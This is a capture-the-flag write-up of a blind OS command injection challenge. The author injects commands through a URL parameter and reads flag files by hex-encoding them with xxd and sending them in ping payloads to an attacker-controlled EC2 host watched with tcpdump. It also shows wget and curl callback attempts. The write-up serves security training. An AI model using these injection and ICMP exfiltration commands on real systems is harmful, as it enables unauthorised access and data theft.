## HACKIM8 - Web 3 - Blind OS command injection

In this interesting challenge, application is taking user input and passes it to a application code that runs a task on the underlying server. I have tried to execute simple OS command but I could not able to see any response so immediately I have started my EC2 amazon server and force vulnerable app to send a request to my cloud server. I have tried below steps: 
   
      http://54.89.146.217/index.php?cmd=wget%20http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com
      http://54.89.146.217/index.php?cmd=curl%20http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com
 
 None of the above command worked for me. Either application was filtering word like wget, curl or it was not allowing any outbound connection however the last try worked for me and that was ping command:
 
      http://54.89.146.217/index.php?cmd=ping%20http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com

I have started tcpdump on my cloud server and I was able to see packet.

![Alt text](https://github.com/sagarpopat/CTF-wirteup/blob/master/images/packet_1.PNG "Optional Title") 

I took the advantage of ping command I have tried to check if hping3 or scappy were installed on linux box but unfortunately none of them were present on server as I was not able to see any ICMP requests for below condition: 
       
       http://54.89.146.217/index.php?cmd=if test -e "/usr/bin/scappy";then ping -c2 http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com;fi;
       http://54.89.146.217/index.php?cmd=if test -e "/usr/sbin/hping3";then ping -c2 ec2-35-166-203-92.us-west-2.compute.amazonaws.com;fi;

Alright so after spending enought time, I was able to figure out below things:

- OS Commands were being executed on the server side but it was not reflecting back in response. 
- Server was also not accepting few utilities/commands like `wget`,`hping3`,`scappy`,`curl`,`http` and many more however it was accepting ping command so I need to read the flag file using some command and send that flag to my server through ICMP packet.

Before I execute any command blindly on CTF server, I thought to send few ICMP packets with some data to my cloud server.  

![Alt text](https://github.com/sagarpopat/CTF-wirteup/blob/master/images/ping_req.PNG "Optional Title") 

I quickly crafted command which will first read flag1 file and send that through ICMP packet. Below was my final attempt to read flagpart1.txt file:
 
    http://54.89.146.217/index.php?cmd=ping ec2-35-166-203-92.us-west-2.compute.amazonaws.com -p $(xxd -p /home/nullcon/flagpart1.txt)

Reading ICMP packets on my server using tcpdump
   
  ![Alt text](https://github.com/sagarpopat/CTF-wirteup/blob/master/images/flag1.PNG "Optional Title") 

Flag 1 from flagpart1.txt was '0omgth4t'. 

Reading flagpart2.txt file: 
   
    http://54.89.146.217/index.php?cmd=ping ec2-35-166-203-92.us-west-2.compute.amazonaws.com -p $(xxd -p /home/nullcon/flagpart2.txt)

Reading ICMP packets on my server using tcpdump

    ![Alt text](https://github.com/sagarpopat/CTF-wirteup/blob/master/images/flag2.PNG "Optional Title") 

Flag 2 from flagpart2.txt was 'aniceflag'. 
   
and our final flag(flagpart1+flagpart2) is
   
      flag{0omgth4taniceflag}
    
## Credits
- Shubham Mittal
- Sanjog Panda
- Archita Aparichita
- Pratap Chandra
- Chandrakant Nial
- Swaroop Yermalkar


